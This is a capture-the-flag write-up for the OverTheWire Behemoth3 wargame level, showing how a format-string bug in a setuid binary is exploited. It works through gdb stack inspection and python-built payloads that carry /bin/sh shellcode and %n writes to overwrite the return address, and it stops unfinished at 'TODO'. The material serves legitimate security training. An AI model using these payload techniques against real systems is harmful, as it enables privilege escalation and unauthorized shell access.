#Behemoth3

behemoth.labs.overthewire.org

**Username:** behemoth3
**Password:** see [behemoth2](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Behemoth/Behemoth2)
**Description:**  

This wargame deals with a lot of regular vulnerabilities found commonly 'out in the wild'. While the game makes no attempts at emulating a real environment it will teach you how to exploit several of the most common coding mistakes including buffer overflows, race conditions and privilege escalation. 

##Write-up

You know the routine by now.

```
# file behemoth3
behemoth3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c5dbd3c173034d55cfef4bb66829b1bd1ec42d22, not stripped
```

```
# ~/checksec.sh --file behemoth3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   behemoth3
```

```
# ./behemoth3 
Identify yourself: AAAA
Welcome, AAAA

aaaand goodbye again.
```

Let's throw in the psudeocode for ```main``` just for good measure.

```C
int main(int arg0) {
    printf("Identify yourself: ");
    eax = *__TMC_END__;
    fgets(((esp & 0xfffffff0) - 0xe0) + 0x18, 0xc8, eax);
    printf("Welcome, ");
    printf(((esp & 0xfffffff0) - 0xe0) + 0x18);
    puts("\naaaand goodbye again.");
    return 0x0;
}
```

A quick try of a few commands and we are well on our way.

```
# python -c 'print "A"*1000' | ./behemoth3
Identify yourself: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aaaand goodbye again.
```

Clear it's not a buffer overflow.

```
# python -c 'print "A"*4+"%x"*10' | ./behemoth3
Identify yourself: Welcome, AAAAc8f778fc2000f77db0004141414178257825782578257825782578257825

aaaand goodbye again.
# python -c 'print "A"*4+"%x"*6' | ./behemoth3
Identify yourself: Welcome, AAAAc8f777cc2000f77c800041414141

aaaand goodbye again.
```

And even more clear that we're dealing with a string format vulnerability.  It looks like our ```0x41414141``` is popped off after 6 ```%x```.  We can definately reference back to [narnia7](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Narnia7) for this one. Let's first try to locate the memory address where our input starts as that will likely be where we want to point back to.

```asm
             main:
0804847d         push       ebp                                                 ; XREF=_start+23
0804847e         mov        ebp, esp
08048480         and        esp, 0xfffffff0
08048483         sub        esp, 0xe0
08048489         mov        dword [ss:esp], 0x8048570                           ; "Identify yourself: ", argument "format" for method j_printf
08048490         call       j_printf
08048495         mov        eax, dword [ds:__TMC_END__]                         ; __TMC_END__
0804849a         mov        dword [ss:esp+0x8], eax                             ; argument "stream" for method j_fgets
0804849e         mov        dword [ss:esp+0x4], 0xc8                            ; argument "size" for method j_fgets
080484a6         lea        eax, dword [ss:esp+0x18]
080484aa         mov        dword [ss:esp], eax                                 ; argument "str" for method j_fgets
080484ad         call       j_fgets
080484b2         mov        dword [ss:esp], 0x8048584                           ; "Welcome, ", argument "format" for method j_printf
080484b9         call       j_printf
080484be         lea        eax, dword [ss:esp+0x18]
080484c2         mov        dword [ss:esp], eax                                 ; argument "format" for method j_printf
080484c5         call       j_printf
080484ca         mov        dword [ss:esp], 0x804858e                           ; "\\naaaand goodbye again.", argument "s" for method j_puts
080484d1         call       j_puts
080484d6         mov        eax, 0x0
080484db         leave      
080484dc         ret        
                        ; endp
```

We can set a breakpoint after we read our input and examine the stack.

```
# python -c 'print "A"*4+"%x"*6' > input
# gdb behemoth3
(gdb) break * 0x080484b2
Breakpoint 1 at 0x80484b2
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input

Breakpoint 1, 0x080484b2 in main ()
(gdb) x/25x $esp
0xffffd170:	0xffffd188	0x000000c8	0xf7fb1c20	0x00000000
0xffffd180:	0x00000000	0xf7ffd000	0x41414141	0x78257825
0xffffd190:	0x78257825	0x78257825	0xffff000a	0x08048200
0xffffd1a0:	0xffffd208	0xf7ffda8c	0x00000000	0xf7fd9b58
0xffffd1b0:	0x00000001	0x00000000	0x00000001	0xf7ffd930
0xffffd1c0:	0xf7ff6300	0x00000000	0xf7e0a940	0x00000001
0xffffd1d0:	0x00000003
```

Looks like our input starts at ```0xffffd188```.  Our payload should look something like ```<address of first byte>JUNK<address of second byte>JUNK<address of third byte>JUNK<address of fourth byte><shellcode>%x%x%x%<first width>x%n%<second width>x%n%<third width>x%n%<fourth width>x%n```.  This means our shellcode should start at ```0xffffd1a4``` if we did our math right.  Now let's find out where the return address is.

```
(gdb) break * 0x80484dc
Breakpoint 1 at 0x80484dc
(gdb) run
Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 
Identify yourself: Test
Welcome, Test

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0xf7e24a63	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
```

So basically our goal is to overwrite ```0xffffd25c``` with ```0xffffd1a4```.  Let's go ahead and try to calculate our first width.  To do that we need to find out what gets written by default, and the use the ```"the byte to be written" - "the outputted byte" + 8``` formula.

```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%8x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000f7ffd000

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x0000004c	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
(gdb) p 0xa4 - 0x4c + 8
$1 = 96
```
```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x000000a4	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
```

Perfect.  We got our first byte done.  The to calculate the rest.  The other bytes will follow the format of ```"the byte we want to write" - "the previous byte"```.

TODO
